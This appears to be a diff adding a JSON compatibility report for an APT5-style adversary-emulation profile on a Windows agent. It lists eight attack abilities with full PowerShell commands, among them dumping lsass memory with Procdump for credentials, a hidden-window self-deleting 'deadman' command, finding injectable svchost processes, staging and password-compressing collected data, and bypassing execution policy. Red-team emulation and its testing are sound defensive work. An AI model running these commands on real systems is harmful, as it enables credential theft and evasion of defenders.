@@ -1,0 +1,144 @@
+{
+  "agent_paw": "zqahqp",
+  "agent_host": "PDL2",
+  "agent_platform": "windows",
+  "agent_executors": [
+    "cmd",
+    "psh",
+    "proc"
+  ],
+  "adversary_id": "temp-seed-zqahqp-1775125295",
+  "adversary_name": "Temp Seed Windows - APT5 Auto Profile Windows",
+  "referenced_ability_count": 8,
+  "compatible_count": 8,
+  "incompatible_count": 0,
+  "missing_count": 0,
+  "fixed_embedded_count": 0,
+  "compatible": [
+    {
+      "ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7",
+      "name": "Discover injectable process",
+      "tactic": "discovery",
+      "technique_id": "T1057",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 9,
+      "windows_command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    },
+    {
+      "ability_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "name": "Deadman - Delete agent file",
+      "tactic": "defense-evasion",
+      "technique_id": "T1070.004",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 3,
+      "windows_command": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;\n$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;\n$processClass = Get-CimClass -ClassName Win32_Process;\nInvoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{\n    Commandline = 'cmd.exe /c \"timeout /nobreak /t 10 >nul 2>nul & del /f #{location}\"';\n    ProcessStartupInformation = [CimInstance]$startupInfo\n};",
+      "has_requirements": false,
+      "unresolved_placeholders": [
+        "#{location}"
+      ],
+      "seed_ready": false,
+      "seed_reason": "unresolved placeholders: #{location}"
+    },
+    {
+      "ability_id": "638fb6bb-ba39-4285-93d1-7e4775b033a8",
+      "name": "Find System Network Connections",
+      "tactic": "discovery",
+      "technique_id": "T1049",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 3,
+      "windows_command": "netstat -anto;\nGet-NetTCPConnection",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    },
+    {
+      "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "name": "Create staging directory",
+      "tactic": "collection",
+      "technique_id": "T1074.001",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 1,
+      "windows_command": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    },
+    {
+      "ability_id": "0ef4cc7b-611c-4237-b20b-db36b6906554",
+      "name": "Leverage Procdump for lsass memory",
+      "tactic": "credential-access",
+      "technique_id": "T1003.001",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 1,
+      "windows_command": "$ps_url = \"https://download.sysinternals.com/files/Procdump.zip\";\n$download_folder = \"C:\\Users\\Public\\\";\n$staging_folder = \"C:\\Users\\Public\\temp\";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder\"Procdump.zip\" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder\"\\procdump64.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder\"\\procdump.exe -accepteula -ma lsass.exe\" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    },
+    {
+      "ability_id": "30a8cf10-73dc-497c-8261-a64cc9e91505",
+      "name": "Compress staged directory (Password Protected)",
+      "tactic": "collection",
+      "technique_id": "T1560.001",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 1,
+      "windows_command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archive.password}\" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select",
+      "has_requirements": true,
+      "unresolved_placeholders": [
+        "#{host.dir.staged}",
+        "#{host.dir.staged}",
+        "#{host.archive.password}",
+        "#{host.dir.staged}"
+      ],
+      "seed_ready": false,
+      "seed_reason": "has requirements"
+    },
+    {
+      "ability_id": "1c353eb4-29ab-4dfe-88ed-f34f5a60848e",
+      "name": "File and Directory Discovery",
+      "tactic": "discovery",
+      "technique_id": "T1083",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 1,
+      "windows_command": "Get-ChildItem -Path #{host.system.path}",
+      "has_requirements": true,
+      "unresolved_placeholders": [
+        "#{host.system.path}"
+      ],
+      "seed_ready": false,
+      "seed_reason": "has requirements"
+    },
+    {
+      "ability_id": "315cedf1-4a3a-4015-b63f-149d64bacbbc",
+      "name": "Emulate Administrator Tasks",
+      "tactic": "execution",
+      "technique_id": "T1059.001",
+      "resolution": "live",
+      "reason": "compatible",
+      "noisy_score": 0,
+      "windows_command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"",
+      "has_requirements": false,
+      "unresolved_placeholders": [],
+      "seed_ready": true,
+      "seed_reason": "seed-ready"
+    }
+  ],
+  "incompatible": [],
+  "missing": [],
+  "noisy_only_mode": false,
+  "seed_only_mode": false
+}
